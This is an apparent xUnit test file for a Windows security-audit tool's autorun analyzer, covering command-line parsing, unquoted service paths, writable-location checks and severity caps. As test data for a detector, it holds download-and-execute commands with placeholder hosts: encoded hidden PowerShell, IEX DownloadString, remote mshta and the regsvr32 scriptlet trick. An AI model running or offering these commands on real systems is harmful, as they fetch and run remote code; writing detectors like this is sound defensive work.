using static Nexora.SecurityAudit.Tests.Fakes;

namespace Nexora.SecurityAudit.Tests;

public class AutorunTests
{
    [Theory]
    [InlineData(@"""C:\Program Files\App\app.exe"" --tray", @"C:\Program Files\App\app.exe")]
    [InlineData(@"C:\Program Files\App\app.exe --tray", @"C:\Program Files\App\app.exe")]
    [InlineData(@"C:\Tools\x.exe", @"C:\Tools\x.exe")]
    [InlineData(@"\??\C:\Drivers\d.sys", @"C:\Drivers\d.sys")]
    [InlineData(@"\SystemRoot\System32\svchost.exe -k netsvcs", @"C:\Windows\System32\svchost.exe")]
    [InlineData(@"rundll32.exe C:\x\y.dll,Entry", "rundll32.exe")]
    [InlineData("", null)]
    public void ImagePath(string command, string? expected) => Assert.Equal(expected, CommandLine.ImagePath(command));

    [Theory]
    [InlineData(@"C:\Program Files\My App\svc.exe -run", true)]
    [InlineData(@"""C:\Program Files\My App\svc.exe"" -run", false)]
    [InlineData(@"C:\Tools\svc.exe", false)]
    public void UnquotedServicePath(string command, bool expected) => Assert.Equal(expected, CommandLine.IsUnquotedPathWithSpaces(command));

    [Theory]
    [InlineData(@"C:\Users\me\AppData\Local\Temp\a.exe", true, true)]
    [InlineData(@"C:\Users\Public\a.exe", true, true)]
    [InlineData(@"C:\ProgramData\a.exe", true, true)]
    [InlineData(@"C:\ProgramData\Vendor\a.exe", false, false)]
    [InlineData(@"C:\Users\me\AppData\Local\Discord\Update.exe", true, false)]
    [InlineData(@"C:\Program Files\App\a.exe", false, false)]
    public void WritableLocations(string path, bool writable, bool unusual)
    {
        Assert.Equal(writable, CommandLine.IsUserWritableLocation(path, out var u));
        Assert.Equal(unusual, u);
    }

    [Theory]
    [InlineData("powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", true)]
    [InlineData("powershell -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://x')\"", true)]
    [InlineData("mshta http://example.test/a.hta", true)]
    [InlineData(@"regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll", true)]
    [InlineData(@"wscript.exe C:\Users\me\AppData\Roaming\a.vbs", true)]
    [InlineData(@"""C:\Program Files\App\app.exe"" --minimized", false)]
    [InlineData(@"powershell.exe -File C:\Scripts\backup.ps1", false)]
    public void SuspiciousPatterns(string command, bool suspicious) => Assert.Equal(suspicious, CommandLine.SuspiciousPattern(command) is not null);

    [Fact]
    public void UnsignedInTemp_IsMediumHeuristic_MediumConfidence()
    {
        var r = AutorunAnalyzer.Assess(Autorun(@"C:\Users\me\AppData\Local\Temp\upd.exe"))!;
        Assert.Equal(Severity.Medium, r.Severity);
        Assert.Equal(FindingKind.Heuristic, r.Kind);
        Assert.Equal(Confidence.Medium, r.Confidence);
    }

    [Fact]
    public void UnsignedInLocalAppData_IsLowConfidence()
    {
        var r = AutorunAnalyzer.Assess(Autorun(@"C:\Users\me\AppData\Local\Tool\tool.exe"))!;
        Assert.Equal(Confidence.Low, r.Confidence);
    }

    [Fact]
    public void SignedProgramFiles_IsNotReported()
    {
        Assert.Null(AutorunAnalyzer.Assess(Autorun(@"""C:\Program Files\App\app.exe""", SignatureState.Valid)));
        // Неподписанный файл в Program Files — тоже не повод для тревоги.
        Assert.Null(AutorunAnalyzer.Assess(Autorun(@"""C:\Program Files\App\app.exe""")));
    }

    [Fact]
    public void MissingFile_IsInfo()
    {
        var r = AutorunAnalyzer.Assess(Autorun(@"C:\Program Files\Gone\gone.exe", exists: false))!;
        Assert.Equal(Severity.Info, r.Severity);
    }

    [Fact]
    public void NoAutorunHeuristic_EverClaimsCritical()
    {
        var commands = new[]
        {
            "powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", @"C:\Users\Public\x.exe", @"C:\Windows\Temp\y.exe",
            "mshta javascript:alert(1)", @"C:\Program Files\A B\c.exe",
        };
        foreach (var c in commands)
            foreach (var loc in Enum.GetValues<AutorunLocation>())
                if (AutorunAnalyzer.Assess(Autorun(c, loc: loc)) is { } r)
                {
                    Assert.True(r.Severity <= Severity.Medium, c);
                    Assert.NotEqual(Confidence.High, r.Confidence);
                }
    }

    [Fact]
    public void StableId_IsDeterministic()
    {
        var a = Autorun("x.exe");
        Assert.Equal(AutorunAnalyzer.StableId(a), AutorunAnalyzer.StableId(a with { Command = "y.exe" }));
        Assert.NotEqual(AutorunAnalyzer.StableId(a), AutorunAnalyzer.StableId(a with { Name = "other" }));
    }

    [Fact]
    public void AutorunsUnavailable()
    {
        var r = Assert.Single(AutorunAnalyzer.Analyze(Snapshot() with { Autoruns = Na<IReadOnlyList<AutorunEntry>>() }));
        Assert.Equal(CheckStatus.Unavailable, r.Status);
    }
}
